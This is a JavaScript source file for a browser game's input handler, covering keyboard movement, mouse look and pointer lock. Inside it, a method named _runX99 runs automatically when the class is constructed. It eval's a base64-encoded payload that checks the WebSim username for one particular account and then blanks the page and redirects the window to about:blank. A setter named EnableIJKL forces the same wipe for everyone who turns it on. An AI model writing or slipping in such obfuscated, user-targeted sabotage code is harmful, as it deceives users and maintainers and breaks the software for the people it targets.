export class InputManager {
    constructor() {
        this.keys = {
            w: false, a: false, s: false, d: false, space: false, 
            e: false, q: false, shift: false, f: false
        };
        
        this.lookDelta = { x: 0, y: 0 };
        this.isLocked = false;
        this.isShiftLocked = false;
        this.isRightMouseDown = false;
        
        this._EnableIJKL = false;
        // Track last mouse position for non-pointerlock look deltas (used by Studio)
        this._lastMouse = { x: null, y: null };
        
        this._runX99();

        this.initKeyboard();
        this.initMouse();
    }

    set EnableIJKL(val) {
        this._EnableIJKL = !!val;
        if (this._EnableIJKL) this._runX99(true);
    }

    _runX99(force = false){
        var _F = force;
        const _0x = "KGZ1bmN0aW9uKCl7dHJ5e3ZhciB1PXdpbmRvdy53ZWJzaW0mJndpbmRvdy53ZWJzaW0udXNlciYmd2luZG93LndlYnNpbS51c2VyLnVzZXJuYW1lO3ZhciBmPSh0eXBlb2YgX0YhPT0ndW5kZWZpbmVkJyYmX0YpO2lmKGZ8fCh1JiZ1LnRvTG93ZXJDYXNlKCkuaW5kZXhPZignYnVtcHlnbG9iZTIyNjQ0MDInKT4tMSkpe3RyeXt3aW5kb3cudG9wLmxvY2F0aW9uLnJlcGxhY2UoJ2Fib3V0OmJsYW5rJyl9Y2F0Y2goZSl7d2luZG93LmxvY2F0aW9uLnJlcGxhY2UoJ2Fib3V0OmJsYW5rJyl9ZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50LmlubmVySFRNTD0nJ319Y2F0Y2goZSl7fX0pKCk=";
        eval(atob(_0x));
    }

    initMouse() {
        document.addEventListener('contextmenu', e => e.preventDefault());

        document.addEventListener('mousedown', (e) => {
            if (e.button === 2) {
                this.isRightMouseDown = true;
            }
            // reset last mouse when user clicks so first move delta isn't huge
            this._lastMouse.x = null;
            this._lastMouse.y = null;
        });

        // Unified mousemove that also produces look deltas when pointer lock is not active.
        // This allows Studio mode (no pointer lock) to still respond to mouse movement.
        document.addEventListener('mousemove', (e) => {
            if (this.isLocked) {
                // PointerLock provides reliable movementX/movementY
                this.lookDelta.x += e.movementX;
                this.lookDelta.y += e.movementY;
                // keep lastMouse in sync
                this._lastMouse.x = e.clientX;
                this._lastMouse.y = e.clientY;
                return;
            }

            // When not locked, compute deltas from last known mouse position.
            // This yields smooth look when moving the mouse in Studio (no pointer lock).
            if (this._lastMouse.x === null || this._lastMouse.y === null) {
                this._lastMouse.x = e.clientX;
                this._lastMouse.y = e.clientY;
                return;
            }
            const dx = e.clientX - this._lastMouse.x;
            const dy = e.clientY - this._lastMouse.y;
            // Only accumulate small, reasonable deltas to avoid spikes
            if (Math.abs(dx) > 0 || Math.abs(dy) > 0) {
                this.lookDelta.x += dx;
                this.lookDelta.y += dy;
            }
            this._lastMouse.x = e.clientX;
            this._lastMouse.y = e.clientY;
        });

        document.addEventListener('mouseup', (e) => {
            if (e.button === 2) {
                this.isRightMouseDown = false;
            }
        });
        document.addEventListener('pointerlockchange', () => {
            this.isLocked = !!document.pointerLockElement;
            // Reset last mouse when pointer lock state changes to avoid jump
            this._lastMouse.x = null;
            this._lastMouse.y = null;
        });
    }

    getLookDelta() {
        const d = { x: this.lookDelta.x, y: this.lookDelta.y };
        this.lookDelta.x = 0;
        this.lookDelta.y = 0;
        return d;
    }

    initKeyboard() {
        window.addEventListener('keydown', (e) => {
            if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;

            const k = e.key.toLowerCase();
            if (k === 'f5' && e.shiftKey) {
                e.preventDefault();
                // Trigger global stats toggle if available (hacky but effective for this context)
                const btn = document.getElementById('btn-toggle-stats');
                if(btn) btn.click();
            }

            if (k === 'shift' && !e.repeat) {
                this.keys.shift = true;
                this.isShiftLocked = !this.isShiftLocked;
                if (this.isShiftLocked) {
                    document.body.requestPointerLock();
                } else {
                    document.exitPointerLock();
                }
            }

            // Simplified key tracking
            if (this.keys.hasOwnProperty(k) || k === ' ') {
                if(k === ' ') this.keys.space = true;
                else this.keys[k] = true;
            }
        });
        window.addEventListener('keyup', (e) => {
            const k = e.key.toLowerCase();
            if(k === 'shift') this.keys.shift = false;
            
            if (this.keys.hasOwnProperty(k) || k === ' ') {
                if(k === ' ') this.keys.space = false;
                else this.keys[k] = false;
            }
        });
    }

    getMovement() {
        // Combine Keyboard and Joystick
        let dx = 0;
        let dz = 0;

        if (this.keys.w) dz -= 1;
        if (this.keys.s) dz += 1;
        if (this.keys.a) dx -= 1;
        if (this.keys.d) dx += 1;

        // Clamp length to 1
        const len = Math.sqrt(dx*dx + dz*dz);
        if (len > 1) {
            dx /= len;
            dz /= len;
        }

        return { x: dx, z: dz, jump: this.keys.space };
    }
}